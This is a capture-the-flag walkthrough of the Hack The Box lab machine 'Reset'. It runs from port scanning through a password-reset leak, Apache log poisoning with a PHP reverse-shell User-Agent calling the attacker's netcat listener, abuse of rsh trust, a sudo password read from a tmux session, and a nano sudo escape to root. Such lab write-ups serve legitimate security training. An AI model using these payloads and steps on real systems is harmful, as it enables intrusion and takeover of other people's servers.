---
layout: post
title: "[HTB] Reset"
description: "[Machine] - Easy difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---
![](/img/htb_img/Reset_img/img1.png)

- OS: Linux
- Release Date: 15 Jul 2025
- Difficulty: Easy

# Enumeration
## Nmap recon
```
â¯ sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -oG allports $target
[sudo] contraseÃ±a para u809: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 12:57 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.11s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
512/tcp open  exec
513/tcp open  login
514/tcp open  shell

Nmap done: 1 IP address (1 host up) scanned in 15.12 seconds
```

Scripts and versions.
```
â¯ extractPorts allports

[*] Extracting information...

	[*] IP Address: 10.129.xx.xx
	[*] Open ports: 22,80,512,513,514

[*] Ports copied to clipboard

â¯ nmap -p22,80,512,513,514 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 12:59 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.18s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6a:16:1f:c8:fe:fd:e3:98:a6:85:cf:fe:7b:0e:60:aa (ECDSA)
|_  256 e4:08:cc:5f:8e:56:25:8f:38:c3:ec:df:b8:86:0c:69 (ED25519)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Admin Login
|_http-server-header: Apache/2.4.52 (Ubuntu)
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login?
514/tcp open  shell   Netkit rshd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.78 seconds
```

Only two ports open:
- TCP 22: OpenSSH, nothing to see right now.
- TCP 80: HTTP, Apache server, the starting point.
No DNS entrys here so we will be working with IP-only.

## TCP 80: Apache HTTP
![](/img/htb_img/Reset_img/img2.png)
We can only see a login prompt, where we can enter the username and password to login. We can also see a `Forgot Password?`, we can check that out.

![](/img/htb_img/Reset_img/img3.png)

If we enter a user that doesn't exist we get the following:
![](/img/htb_img/Reset_img/img4.png)
But if we enter `admin`:

![](/img/htb_img/Reset_img/img5.png)
So, we could potentially enumerate users with this, but first let's catch this response with BurpSuite.

### Catching responses
```
HTTP/1.1 200 OK
Date: Sat, 01 Nov 2025 17:55:50 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Length: 80
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{"username":"admin","new_password":"6584601c","timestamp":"2025-11-01 17:55:50"}
```

The new password is there and we can try to use it.

![](/img/htb_img/Reset_img/img7.png)
We can view two logs:
- syslog
- auth.log

### Catching the logs response
Both seem to be empty because of this VIP+ instance maybe, so we can try to catch it with burpsuite again.
```
POST /dashboard.php HTTP/1.1
Host: 10.129.xx.xx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://10.129.xx.xx
Connection: keep-alive
Referer: http://10.129.xx.xx/dashboard.php
Cookie: PHPSESSID=cd4agc6b2ec8c7rtbujf3ddvh8
Upgrade-Insecure-Requests: 1
Priority: u=0, i

file=%2Fvar%2Flog%2Fsyslog
```

At first sight this could be a path traversal vulnerability but in this case this technique doesn't work. I also tried command injection but same result. 

We know the server is using Apache so we can try to get the file `/var/log/apache2/access.log`.
In the response we can see a bunch of the following:
```
10.10.xx.xx - - [03/Nov/2025:16:56:18 +0000] &quot;POST /dashboard.php HTTP/1.1&quot; 200 1169 &quot;http://10.129.xx.xx/dashboard.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 
```

As we can see, the user agent is being written down so we can try to log poison this entries by modifying our own User Agent on the request.

#### Log poisoning & Shell as www-data
```
User-Agent: ?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 4444 >/tmp/f'); ?>
```

We can introduce a revshell using mkfifo on the User-Agent.
After sending the syslog request with a fake user agent, we access the `access.log` again to trigger the reverse shell, having a shell handler fired up already.

```
â¯ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 â†’  127.0.0.1 â€¢ 10.0.0.157 â€¢ 10.10.xx.xx
â¤  ğŸ  Main Menu (m) ğŸ’€ Payloads (p) ğŸ”„ Clear (Ctrl-L) ğŸš« Quit (q/Ctrl-C)
[+] Got reverse shell from reset~10.129.xx.xx-Linux-x86_64 ğŸ˜ï¸ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! ğŸ’ª
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/u809/.penelope/sessions/reset~10.129.xx.xx-Linux-x86_64/2025_11_03-18_14_06-180.log ğŸ“œ
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
www-data@reset:/var/www/html$
```

### User flag
```
www-data@reset:/var/www/html$ cat /home/sadm/user.txt 
<REDACTED>
www-data@reset:/var/www/html$
```

# Lateral Movement
After doing a bit of enumeration, I remembered that we found a `Rservices` before, so I checked the `hosts.equiv` file:
```
www-data@reset:/var/www/html$ cat /etc/hosts.equiv 
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#		   command access to your system .
- root
- local
+ sadm
www-data@reset:/var/www/html$
```

As we can see, the relevant user that we need to catch is `sadm`.
This user is allowed to access the target machine via rsh , rlogin , or rcp without a password, from any remote host listed in `/etc/hosts` or `~/.rhosts`.

So, in our attacker machine we can create this user and log in directly to the machine.
```
â¯ su sadm
ContraseÃ±a: 
$ id
uid=1001(sadm) gid=1001(sadm) grupos=1001(sadm)
$
```

## Log in with rlogin
```
$ rlogin sadm@10.129.xx.xx
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Nov  3 05:22:49 PM UTC 2025

  System load:           0.0
  Usage of /:            65.1% of 5.22GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             229
  Users logged in:       1
  IPv4 address for eth0: 10.129.xx.xx
  IPv6 address for eth0: dead:beef::250:56ff:fe94:fdd9

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul  9 13:32:23 UTC 2025 from 10.10.xx.xx on pts/0
sadm@reset:~$
```

# Privilege Escalation
We can check for the processes:
```
sadm@reset:~$ ps -faux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
<...>

sadm        1227  0.0  0.2   8764  4132 ?        Ss   17:10   0:00 tmux new-session -d -s sadm_session

<...>
sadm@reset:~$
```

We can see a `tmux` session opened, `tmux` is a terminal multiplexer.
We can attach to this session.

## Attaching to tmux session
```
tmux attach -t sadm_session
```

```
echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
sadm@reset:~$ echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
Too many errors from stdin
sadm@reset:~$ 
```

Because of the previous command, we have the sudo permission on cache and we can check for it:
```
sadm@reset:~$ sudo -l
Matching Defaults entries for sadm on reset:
    env_reset, timestamp_timeout=-1, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !syslog

User sadm may run the following commands on reset:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
sadm@reset:~$
```

We can execute nano with sudo permission to write the `firewall.sh` file.
If we check on `GTFOBins`, we can see that we can elevate our privileges by doing the following:
https://gtfobins.github.io/gtfobins/nano/#sudo
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

This drops a shell as root:
```
# # id
uid=0(root) gid=0(root) groups=0(root)
```

### Root flag
```
# ls /root
root_279e22f8.txt  snap
# cat /root/root_279e22f8.txt
<REDACTED>
```